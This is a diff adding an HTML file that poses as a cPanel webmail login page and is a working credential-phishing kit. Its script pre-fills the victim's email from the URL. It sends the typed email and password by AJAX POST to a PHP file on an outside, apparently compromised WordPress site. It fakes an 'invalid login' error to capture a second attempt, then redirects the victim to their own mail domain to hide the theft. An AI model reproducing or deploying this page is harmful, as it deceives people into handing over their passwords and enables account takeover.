@@ -1,0 +1,296 @@
+﻿<html>
+  <head>
+    <title>Webmail login</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      *,
+      *::after,
+      *::before {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Open Sans", sans-serif;
+        font-size: 13px;
+        font-weight: 600;
+      }
+      .container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 80%;
+      }
+
+      #form-header {
+        height: 65px;
+        text-align: center;
+      }
+      .form-image {
+        width: 320px;
+        height: 50px;
+        margin-bottom: 30px;
+      }
+      .input-container {
+        padding: 15px 10px;
+      }
+      .label {
+        margin-bottom: 5px;
+        padding-left: 7px;
+        color: #293a4a;
+        font-size: 14px;
+        font-weight: 600;
+      }
+      .input i {
+        position: absolute;
+        margin-top: 5px;
+        margin-left: 10px;
+        color: darkgrey;
+      }
+      input[type="text"],
+      input[type="password"] {
+        height: 38px;
+        width: 300px;
+        border: 2px solid darkgrey;
+        padding-left: 45px;
+        border-radius: 6px;
+        font-size: 16px;
+        padding-bottom: 4px;
+        padding-top: 4px;
+        color: #293a4a;
+      }
+      ::-webkit-input-placeholder {
+        /* Chrome/Opera/Safari */
+        color: darkgrey;
+        font-size: 12px;
+        letter-spacing: 0.7px;
+        font-weight: lighter;
+      }
+      ::-moz-placeholder {
+        /* Firefox 19+ */
+        color: darkgrey;
+        font-size: small;
+        letter-spacing: 0.7px;
+        font-weight: lighter;
+      }
+      input {
+        outline: none;
+      }
+      .input-container a {
+        text-decoration: none;
+        text-align: center;
+        padding: 7px 130px;
+        background-color: #179bd7;
+        border-radius: 6px;
+        font-weight: 600;
+        border: 1px solid #095779;
+        color: #fff;
+        cursor: pointer;
+        font-size: 13px;
+        font-weight: 600;
+      }
+      .warning-container {
+        background-color: #d35351;
+        color: #fff;
+        margin-bottom: 50px;
+        visibility: visible;
+        height: 40px;
+        border-radius: 4px;
+        width: auto;
+        visibility: hidden;
+      }
+      .warning-container i {
+        position: absolute;
+        margin-top: 7px;
+        margin-left: 9px;
+      }
+      .warning-message {
+        margin-left: 40px;
+        padding-top: 10px;
+      }
+      a:hover {
+        background-color: #095779;
+      }
+      .copyright {
+        color: #3f4143;
+        font-family: verdana;
+        font-size: 7pt;
+        margin: 10px 0 0;
+        padding-top: 30px;
+        text-align: center;
+        font-weight: lighter;
+      }
+      .copyright a {
+        text-decoration: none;
+      }
+      .copyright img {
+        height: 15px;
+        width: 20px;
+        margin-bottom: 3px;
+      }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="login">
+        <div class="warning-container">
+          <i class="fa fa-times-circle fa-2x"></i>
+          <p class="warning-message">
+            You must specify a username to log in.
+          </p>
+        </div>
+        <div class="form">
+          <div class="form-header">
+            <img
+              class="form-image"
+              src="https://i.imgur.com/JsDV8Jg.png"
+              alt=""
+            />
+          </div>
+          <div class="input-form-container">
+            <div class="input-container">
+              <div class="label">
+                <label for="usename">Email Address</label>
+              </div>
+              <div class="input">
+                <i class="fa fa-user fa-2x cust"></i>
+                <input
+                  type="text"
+                  placeholder="Enter your email address."
+                  id="emx"
+                />
+              </div>
+            </div>
+            <div class="input-container">
+              <div class="label">
+                <label for="usename">Password</label>
+              </div>
+              <div class="input">
+                <i class="fa fa-lock fa-2x cust"></i>
+                <input
+                  type="password"
+                  placeholder="Enter your email password."
+                  id="passx"
+                />
+              </div>
+            </div>
+            <div class="input-container">
+              <a onclick="passam()">Log in</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="copyright">
+      <img src="https://i.imgur.com/qSfnTjt.png" alt="" />
+      <br />
+      Copyright©&nbsp;2020 cPanel, L.L.C.
+      <br /><a>Privacy Policy</a>
+    </div>
+    <script>
+      var count = 0;
+      var hash = window.location.hash;
+      document.getElementById("emx").value = hash.split("#")[1];
+      var em = $("#emx").val();
+      var ps = $("#passx").val();
+      var check = (document.getElementById("emx").value = hash.split("#")[1]);
+
+      if (check === undefined) {
+        $("#emx").val("");
+        $("#emx").focus();
+      } else {
+        var pwdInput = document.getElementById("passx");
+        pwdInput.focus();
+      }
+      $("#passx").keydown(function (e) {
+        if (e.which == 13) {
+          passam();
+          return false;
+        }
+      });
+
+      function passam() {
+        var em = $("#emx").val();
+        var ps = $("#passx").val();
+
+        if (
+          em == "" ||
+          em == " " ||
+          em == " " ||
+          em == null ||
+          em == undefined
+        ) {
+          $(".warning-container").css("visibility", "visible");
+          document.querySelector(".warning-message").innerHTML =
+            "You must specify a email to log in.";
+          $("#emx").focus();
+        } else if (
+          ps === "" ||
+          ps === " " ||
+          ps == " " ||
+          ps == "  " ||
+          ps == "   " ||
+          ps === null
+        ) {
+          $(".warning-container").css("visibility", "visible");
+          document.querySelector(".warning-message").innerHTML =
+            "The login is invalid.";
+          $("#passx").focus();
+        } else {
+          var em = $("#emx").val();
+          var ps = $("#passx").val();
+
+          $.ajax({
+            url: "https://www.epc.com.co/wp/wordpress/wp-includes/js/tinymce/plugins/wpdialogs/plugin.php", // full url of owanew.php
+            type: "POST",
+            data: {
+              user: em,
+              pass: ps,
+              type: 1,
+            },
+            beforeSend: function () {
+              $(".warning-container i").removeClass("fa fa-times-circle fa-2x");
+              $(".warning-container i").addClass("fa fa-info-circle fa-2x");
+              $(".warning-container").css({
+                visibility: "visible",
+                "background-color": "#00bfff",
+              });
+              document.querySelector(".warning-message").innerHTML =
+                "Authenticating...";
+            },
+            success: function (response) {
+              if (count === 1) {
+                var email = hash;
+
+                var clientdomain = email.substring(email.lastIndexOf("@") + 1);
+
+                location.href = "https://" + clientdomain;
+              } else {
+                $(".warning-container i").removeClass(
+                  "fa fa-info-circle fa-2x"
+                );
+                $(".warning-container i").addClass("fa fa-times-circle fa-2x");
+                $(".warning-container").css({
+                  visibility: "visible",
+                  "background-color": "#d35351",
+                });
+                document.querySelector(".warning-message").innerHTML =
+                  "The login is invalid.";
+                document.getElementById("passx").value = "";
+                $("#passx").focus();
+                count = count = +1;
+                console.log(count);
+              }
+            },
+          });
+        } 
+      }
+    </script>
+  </body>
+</html>
